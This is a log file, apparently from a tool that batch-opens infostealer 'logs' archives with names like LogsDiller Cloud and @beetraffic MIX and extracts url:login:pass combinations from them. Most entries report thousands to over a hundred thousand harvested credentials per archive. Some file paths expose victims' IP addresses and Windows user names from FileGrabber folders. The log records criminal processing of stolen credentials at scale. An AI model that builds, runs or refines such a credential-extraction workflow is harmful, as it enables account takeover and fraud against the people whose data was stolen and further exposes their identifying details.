+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_618_#148.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_626_#44.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_645_#256.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_655_#243.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_667_#245.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:50] PASSWORD LogsDiller Cloud_672_#52.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:52] PASSWORD LogsDiller Cloud_678_#55.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:52] PASSWORD LogsDiller Cloud_687_#145.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:53] PASSWORD LogsDiller Cloud_691_#62.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_702_#37.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_711_#24.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_712_#247.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_791_#117.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_792_#244.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_925_#57.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_933_#34.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_939_#30.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_939_#53.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_945_#255.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_946_#32.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_980_#249.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_983_#250.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_990_#248.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1011_#257.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1208_#141.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1221_#108.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1233_#102.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1246_#51.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:54] PASSWORD LogsDiller Cloud_1251_#258.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1252_#252.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1335_#58.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1386_#43.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1411_#100.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1433_#246.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1442_#254.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1468_#114.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1516_#46.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1520_#99.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1564_#147.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1606_#251.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1612_#107.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1613_#110.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1666_#28.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1722_#106.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1778_#95.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1781_#116.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1792_#104.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1858_#113.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1878_#109.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_1909_#115.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2070_#111.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2111_#105.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2511_#98.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2519_#101.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2523_#118.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_2773_#96.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_3277_#253.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_Free_240_#195.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_Free_372_#194.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] PASSWORD LogsDiller Cloud_Free_500_#196.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:55] Password pre-check done: 100/111 openable.
+[2026-06-21 03:49:56] SCAN @beetraffic 1603 MIX 07-04-2026.zip | solid=False type=Zip entries=13490 pwFiles=580 combos=19733 fails=0 time=00:00:00
+[2026-06-21 03:49:56] @beetraffic 1603 MIX 07-04-2026.zip -> COMPLETED SUCCESSFULLY (14.517 url:login:pass found, 580 files) [password: settings password] [00:00:00]
+[2026-06-21 03:49:58] OPEN FAILED Keygen-CORE.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_bba590e411e947a9b273fefcf159a8a6\MM_103.83.189.10_11-04-26\Files\Desktop\freee4pc.org_UltraISO Premium Edition _ 9.7.6.3829\freee4pc.org_UltraISO Premium Edition Crack 9.7.6.3829\Keygen-CORE.rar'
+[2026-06-21 03:49:59] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_bba590e411e947a9b273fefcf159a8a6\MW_102.70.119.90_08-04-26\Files\Desktop\Adplus 002\Downloads\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 03:50:00] SCAN @beetraffic 1609 MIX 14-04-2026.zip | solid=False type=Zip entries=49681 pwFiles=1452 combos=134601 fails=0 time=00:00:03
+[2026-06-21 03:50:00] @beetraffic 1609 MIX 14-04-2026.zip -> COMPLETED SUCCESSFULLY (84.670 url:login:pass found, 1452 files) [password: settings password] [00:00:03]
+[2026-06-21 03:50:00] @beetraffic 3000 MIX 17-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 3000 MIX 20-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 4000 MIX 15-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 4500 MIX 02-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 5000 MIX 08-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 5555 MIX 11-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic 6000 04-06-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic_cloud 1420 MIX 07-05-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic_cloud 1500 MIX 12-05-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic_cloud 1808 MIX 01-05-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:00] @beetraffic_cloud 1972 MIX 28-04-2026.zip -> SKIPPED (no working password found in pre-check)
+[2026-06-21 03:50:03] OPEN FAILED iBypassSignal3.2.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:50:04] OPEN FAILED VG Tool 4.1_KeyGEN (1).rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_418b66f83cfe489a945867db95fe0000\PK_182.188.115.41_18-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 03:50:04] OPEN FAILED VG Tool 4.1_KeyGEN (1).rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_418b66f83cfe489a945867db95fe0000\PK_39.63.29.185_16-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 03:50:04] OPEN FAILED fastboot_lamu_g_user_15_VVTAS35.51_137_2_1_c99c2a_release_keys.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:50:04] SCAN @beetraffic_cloud 4141 MIX 21-04-2026.zip | solid=False type=Zip entries=70110 pwFiles=2925 combos=189399 fails=0 time=00:00:04
+[2026-06-21 03:50:04] @beetraffic_cloud 4141 MIX 21-04-2026.zip -> COMPLETED SUCCESSFULLY (123.648 url:login:pass found, 2925 files) [password: settings password] [00:00:04]
+[2026-06-21 03:50:08] OPEN FAILED RKT_rockusb-v3.00_pass-1111 (1).7z -> DataErrorException: Data Error
+[2026-06-21 03:50:10] OPEN FAILED RKT_rockusb-v3.00_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 03:50:15] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar | solid=False type=Rar entries=14319 pwFiles=477 combos=23820 fails=1 time=00:00:10
+[2026-06-21 03:50:15] ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar -> COMPLETED SUCCESSFULLY (20.653 url:login:pass found, 477 files) [password: settings password] [00:00:10]
+[2026-06-21 03:50:21] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar | solid=False type=Rar entries=11501 pwFiles=497 combos=20690 fails=1 time=00:00:06
+[2026-06-21 03:50:21] ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar -> COMPLETED SUCCESSFULLY (16.332 url:login:pass found, 497 files) [password: settings password] [00:00:06]
+[2026-06-21 03:50:34] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | solid=False type=Rar entries=27584 pwFiles=776 combos=64056 fails=5 time=00:00:12
+[2026-06-21 03:50:34] ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar -> COMPLETED SUCCESSFULLY (51.101 url:login:pass found, 776 files) [password: settings password] [00:00:12]
+[2026-06-21 03:50:47] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️.rar | solid=False type=Rar entries=21158 pwFiles=645 combos=36768 fails=0 time=00:00:12
+[2026-06-21 03:50:47] ⚡️Luffich&Cloud FREE LOGS⚡️.rar -> COMPLETED SUCCESSFULLY (27.864 url:login:pass found, 645 files) [password: settings password] [00:00:12]
+[2026-06-21 03:50:47] ⚡️Luffich&Cloud FREE TXT⚡️ (2).rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:47] ⚡️Luffich&Cloud FREE TXT⚡️ (3).rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:47] ⚡️Luffich&Cloud FREE TXT⚡️.rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:47] SCAN LogsDiller Cloud_ 224_#64.zip | solid=False type=Zip entries=4979 pwFiles=89 combos=4907 fails=0 time=00:00:00
+[2026-06-21 03:50:47] LogsDiller Cloud_ 224_#64.zip -> COMPLETED SUCCESSFULLY (3.931 url:login:pass found, 89 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:47] OPEN FAILED iggtech.com.xforce.2020v2.keygen.Autodesk.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_0480a2ee72bc4f3ca82143804a2a800c\BR[A7638B6169B0E9FA29B4AE201CF32E6F] [2022-04-08T08_32_29.09\FileGrabber\Users\Thayrine\Documents\iggtech.com.xforce.2020v2.keygen.Autodesk.rar'
+[2026-06-21 03:50:47] OPEN FAILED SignCut-Pro-1.95Stable-crack-activation-keygen.rar-Full.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:50:47] SCAN LogsDiller Cloud_ 473_#63.zip | solid=False type=Zip entries=9965 pwFiles=183 combos=11900 fails=0 time=00:00:00
+[2026-06-21 03:50:47] LogsDiller Cloud_ 473_#63.zip -> COMPLETED SUCCESSFULLY (9.892 url:login:pass found, 183 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:47] SCAN LogsDiller Cloud_211_#26.zip | solid=False type=Zip entries=4409 pwFiles=66 combos=3150 fails=0 time=00:00:00
+[2026-06-21 03:50:47] LogsDiller Cloud_211_#26.zip -> COMPLETED SUCCESSFULLY (2.817 url:login:pass found, 66 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:48] SCAN LogsDiller Cloud_308_#54.zip | solid=False type=Zip entries=10288 pwFiles=124 combos=6309 fails=0 time=00:00:00
+[2026-06-21 03:50:48] LogsDiller Cloud_308_#54.zip -> COMPLETED SUCCESSFULLY (5.168 url:login:pass found, 124 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:48] SCAN LogsDiller Cloud_339_#137.zip | solid=False type=Zip entries=6793 pwFiles=184 combos=11920 fails=0 time=00:00:00
+[2026-06-21 03:50:48] LogsDiller Cloud_339_#137.zip -> COMPLETED SUCCESSFULLY (9.879 url:login:pass found, 184 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:48] SCAN LogsDiller Cloud_341_#36.zip | solid=False type=Zip entries=6037 pwFiles=144 combos=7084 fails=0 time=00:00:00
+[2026-06-21 03:50:48] LogsDiller Cloud_341_#36.zip -> COMPLETED SUCCESSFULLY (6.139 url:login:pass found, 144 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:48] SCAN LogsDiller Cloud_401_#47.zip | solid=False type=Zip entries=7669 pwFiles=180 combos=11162 fails=0 time=00:00:00
+[2026-06-21 03:50:48] LogsDiller Cloud_401_#47.zip -> COMPLETED SUCCESSFULLY (9.414 url:login:pass found, 180 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:49] SCAN LogsDiller Cloud_420_#143.zip | solid=False type=Zip entries=8836 pwFiles=243 combos=16058 fails=0 time=00:00:00
+[2026-06-21 03:50:49] LogsDiller Cloud_420_#143.zip -> COMPLETED SUCCESSFULLY (12.798 url:login:pass found, 243 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:49] SCAN LogsDiller Cloud_421_#144.zip | solid=False type=Zip entries=8799 pwFiles=265 combos=13541 fails=0 time=00:00:00
+[2026-06-21 03:50:49] LogsDiller Cloud_421_#144.zip -> COMPLETED SUCCESSFULLY (11.547 url:login:pass found, 265 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:49] SCAN LogsDiller Cloud_433_#150.zip | solid=False type=Zip entries=6917 pwFiles=122 combos=8940 fails=0 time=00:00:00
+[2026-06-21 03:50:49] LogsDiller Cloud_433_#150.zip -> COMPLETED SUCCESSFULLY (8.368 url:login:pass found, 122 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:49] SCAN LogsDiller Cloud_441_#149.zip | solid=False type=Zip entries=8571 pwFiles=155 combos=7989 fails=0 time=00:00:00
+[2026-06-21 03:50:49] LogsDiller Cloud_441_#149.zip -> COMPLETED SUCCESSFULLY (6.826 url:login:pass found, 155 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:50] OPEN FAILED Keygen.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_e4f3d2bc1295437587f8d693e9cc59c3\AR[D38CEA21191629A49A670911E43B021F] [2022-04-06T09_29_50.59\FileGrabber\Users\USUARIO\Documents\Keygen.rar'
+[2026-06-21 03:50:50] SCAN LogsDiller Cloud_451_#59.zip | solid=False type=Zip entries=10305 pwFiles=175 combos=8342 fails=0 time=00:00:00
+[2026-06-21 03:50:50] LogsDiller Cloud_451_#59.zip -> COMPLETED SUCCESSFULLY (7.309 url:login:pass found, 175 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:50] SCAN LogsDiller Cloud_493_#61.zip | solid=False type=Zip entries=9961 pwFiles=178 combos=9738 fails=0 time=00:00:00
+[2026-06-21 03:50:50] LogsDiller Cloud_493_#61.zip -> COMPLETED SUCCESSFULLY (8.877 url:login:pass found, 178 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:51] OPEN FAILED Keygen.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:50:51] SCAN LogsDiller Cloud_493_#119.zip | solid=False type=Zip entries=10518 pwFiles=346 combos=22466 fails=0 time=00:00:00
+[2026-06-21 03:50:51] LogsDiller Cloud_493_#119.zip -> COMPLETED SUCCESSFULLY (19.113 url:login:pass found, 346 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:51] SCAN LogsDiller Cloud_494_#142.zip | solid=False type=Zip entries=9899 pwFiles=267 combos=17153 fails=0 time=00:00:00
+[2026-06-21 03:50:51] LogsDiller Cloud_494_#142.zip -> COMPLETED SUCCESSFULLY (14.425 url:login:pass found, 267 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:51] OPEN FAILED Corel.Products.MultiKeygen-XFORCE.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_0b6c2dafdb5642978e2368602d7d6875\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\Corel.Products.MultiKeygen-XFORCE.rar'
+[2026-06-21 03:50:52] OPEN FAILED icongnghe.com.xforce.2016.keygen.Autodesk.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_0b6c2dafdb5642978e2368602d7d6875\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\icongnghe.com.xforce.2016.keygen.Autodesk.rar'
+[2026-06-21 03:50:52] SCAN LogsDiller Cloud_495_#31.zip | solid=False type=Zip entries=9263 pwFiles=241 combos=14537 fails=0 time=00:00:00
+[2026-06-21 03:50:52] LogsDiller Cloud_495_#31.zip -> COMPLETED SUCCESSFULLY (11.750 url:login:pass found, 241 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:52] SCAN LogsDiller Cloud_502_#79.zip | solid=False type=Zip entries=8665 pwFiles=74 combos=5916 fails=0 time=00:00:00
+[2026-06-21 03:50:52] LogsDiller Cloud_502_#79.zip -> COMPLETED SUCCESSFULLY (5.445 url:login:pass found, 74 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:52] SCAN LogsDiller Cloud_511_#56.zip | solid=False type=Zip entries=10746 pwFiles=188 combos=9473 fails=0 time=00:00:00
+[2026-06-21 03:50:52] LogsDiller Cloud_511_#56.zip -> COMPLETED SUCCESSFULLY (8.190 url:login:pass found, 188 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:53] OPEN FAILED keygen 64bit.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_70dc9758b5514f328ba27808c960f131\ID[9340BFDB0142778F2E2291C3BC92F991] [2022-04-16T14_30_19.32\FileGrabber\Users\Windows 10\Documents\keygen 64bit.zip'
+[2026-06-21 03:50:53] SCAN LogsDiller Cloud_513_#73.zip | solid=False type=Zip entries=10961 pwFiles=179 combos=8733 fails=0 time=00:00:00
+[2026-06-21 03:50:53] LogsDiller Cloud_513_#73.zip -> COMPLETED SUCCESSFULLY (6.346 url:login:pass found, 179 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:53] SCAN LogsDiller Cloud_521_#68.zip | solid=False type=Zip entries=10767 pwFiles=205 combos=12817 fails=0 time=00:00:00
+[2026-06-21 03:50:53] LogsDiller Cloud_521_#68.zip -> COMPLETED SUCCESSFULLY (9.318 url:login:pass found, 205 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:53] OPEN FAILED Keygen Corel 2017.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_6f00c6fe5dc94c878f28802924cc2f5c\BR[71593210121FBB7771961A2CBB07C868] [2022-03-18T18_05_47.85\FileGrabber\Users\Amanda\Documents\Keygen Corel 2017.rar'
+[2026-06-21 03:50:54] SCAN LogsDiller Cloud_526_#35.zip | solid=False type=Zip entries=10202 pwFiles=246 combos=19297 fails=0 time=00:00:00
+[2026-06-21 03:50:54] LogsDiller Cloud_526_#35.zip -> COMPLETED SUCCESSFULLY (14.728 url:login:pass found, 246 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:54] SCAN LogsDiller Cloud_527_#140.zip | solid=False type=Zip entries=9903 pwFiles=276 combos=18018 fails=0 time=00:00:00
+[2026-06-21 03:50:54] LogsDiller Cloud_527_#140.zip -> COMPLETED SUCCESSFULLY (13.858 url:login:pass found, 276 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:54] SCAN LogsDiller Cloud_530_#66.zip | solid=False type=Zip entries=11081 pwFiles=229 combos=11134 fails=0 time=00:00:00
+[2026-06-21 03:50:54] LogsDiller Cloud_530_#66.zip -> COMPLETED SUCCESSFULLY (8.905 url:login:pass found, 229 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:55] OPEN FAILED Wondershare-PDF-Password-Remover-V1.5.0-With-Key-[iahq76]-Full-Version.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:50:55] SCAN LogsDiller Cloud_535_#151.zip | solid=False type=Zip entries=9908 pwFiles=204 combos=10141 fails=0 time=00:00:00
+[2026-06-21 03:50:55] LogsDiller Cloud_535_#151.zip -> COMPLETED SUCCESSFULLY (8.670 url:login:pass found, 204 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:55] SCAN LogsDiller Cloud_537_#146.zip | solid=False type=Zip entries=9998 pwFiles=293 combos=22772 fails=0 time=00:00:00
+[2026-06-21 03:50:55] LogsDiller Cloud_537_#146.zip -> COMPLETED SUCCESSFULLY (18.696 url:login:pass found, 293 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:56] SCAN LogsDiller Cloud_541_#27.zip | solid=False type=Zip entries=11577 pwFiles=270 combos=17570 fails=0 time=00:00:00
+[2026-06-21 03:50:56] LogsDiller Cloud_541_#27.zip -> COMPLETED SUCCESSFULLY (14.964 url:login:pass found, 270 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:56] SCAN LogsDiller Cloud_545_#42.zip | solid=False type=Zip entries=10147 pwFiles=296 combos=14507 fails=0 time=00:00:00
+[2026-06-21 03:50:56] LogsDiller Cloud_545_#42.zip -> COMPLETED SUCCESSFULLY (12.997 url:login:pass found, 296 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:56] SCAN LogsDiller Cloud_578_#50.zip | solid=False type=Zip entries=10989 pwFiles=245 combos=9804 fails=0 time=00:00:00
+[2026-06-21 03:50:56] LogsDiller Cloud_578_#50.zip -> COMPLETED SUCCESSFULLY (8.805 url:login:pass found, 245 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:57] SCAN LogsDiller Cloud_591_#39.zip | solid=False type=Zip entries=11318 pwFiles=244 combos=13428 fails=0 time=00:00:00
+[2026-06-21 03:50:57] LogsDiller Cloud_591_#39.zip -> COMPLETED SUCCESSFULLY (11.872 url:login:pass found, 244 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:57] SCAN LogsDiller Cloud_612_#60.zip | solid=False type=Zip entries=13428 pwFiles=229 combos=16097 fails=0 time=00:00:00
+[2026-06-21 03:50:57] LogsDiller Cloud_612_#60.zip -> COMPLETED SUCCESSFULLY (14.133 url:login:pass found, 229 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:58] SCAN LogsDiller Cloud_618_#148.zip | solid=False type=Zip entries=11711 pwFiles=311 combos=21840 fails=0 time=00:00:00
+[2026-06-21 03:50:58] LogsDiller Cloud_618_#148.zip -> COMPLETED SUCCESSFULLY (19.039 url:login:pass found, 311 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:58] SCAN LogsDiller Cloud_626_#44.zip | solid=False type=Zip entries=12117 pwFiles=263 combos=15054 fails=0 time=00:00:00
+[2026-06-21 03:50:58] LogsDiller Cloud_626_#44.zip -> COMPLETED SUCCESSFULLY (13.542 url:login:pass found, 263 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:58] SCAN LogsDiller Cloud_645_#256.zip | solid=False type=Zip entries=10932 pwFiles=211 combos=10590 fails=0 time=00:00:00
+[2026-06-21 03:50:58] LogsDiller Cloud_645_#256.zip -> COMPLETED SUCCESSFULLY (8.731 url:login:pass found, 211 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:59] SCAN LogsDiller Cloud_655_#243.zip | solid=False type=Zip entries=10992 pwFiles=319 combos=20176 fails=0 time=00:00:00
+[2026-06-21 03:50:59] LogsDiller Cloud_655_#243.zip -> COMPLETED SUCCESSFULLY (16.396 url:login:pass found, 319 files) [password: no password] [00:00:00]
+[2026-06-21 03:50:59] SCAN LogsDiller Cloud_667_#245.zip | solid=False type=Zip entries=12789 pwFiles=296 combos=14222 fails=0 time=00:00:00
+[2026-06-21 03:50:59] LogsDiller Cloud_667_#245.zip -> COMPLETED SUCCESSFULLY (11.336 url:login:pass found, 296 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:00] SCAN LogsDiller Cloud_672_#52.zip | solid=False type=Zip entries=12716 pwFiles=452 combos=33327 fails=0 time=00:00:00
+[2026-06-21 03:51:00] LogsDiller Cloud_672_#52.zip -> COMPLETED SUCCESSFULLY (26.531 url:login:pass found, 452 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:00] SCAN LogsDiller Cloud_678_#55.zip | solid=False type=Zip entries=15254 pwFiles=253 combos=13866 fails=0 time=00:00:00
+[2026-06-21 03:51:00] LogsDiller Cloud_678_#55.zip -> COMPLETED SUCCESSFULLY (11.508 url:login:pass found, 253 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:03] SCAN LogsDiller Cloud_687_#145.zip | solid=False type=Zip entries=15954 pwFiles=366 combos=28478 fails=0 time=00:00:00
+[2026-06-21 03:51:03] LogsDiller Cloud_687_#145.zip -> COMPLETED SUCCESSFULLY (21.817 url:login:pass found, 366 files) [password: no password] [00:00:02]
+[2026-06-21 03:51:03] SCAN LogsDiller Cloud_691_#62.zip | solid=False type=Zip entries=14414 pwFiles=260 combos=12318 fails=0 time=00:00:00
+[2026-06-21 03:51:03] LogsDiller Cloud_691_#62.zip -> COMPLETED SUCCESSFULLY (10.452 url:login:pass found, 260 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:05] SCAN LogsDiller Cloud_702_#37.zip | solid=False type=Zip entries=13991 pwFiles=293 combos=22749 fails=0 time=00:00:01
+[2026-06-21 03:51:05] LogsDiller Cloud_702_#37.zip -> COMPLETED SUCCESSFULLY (16.190 url:login:pass found, 293 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:05] SCAN LogsDiller Cloud_711_#24.zip | solid=False type=Zip entries=14360 pwFiles=532 combos=43182 fails=0 time=00:00:00
+[2026-06-21 03:51:05] LogsDiller Cloud_711_#24.zip -> COMPLETED SUCCESSFULLY (34.057 url:login:pass found, 532 files) [password: no password] [00:00:00]
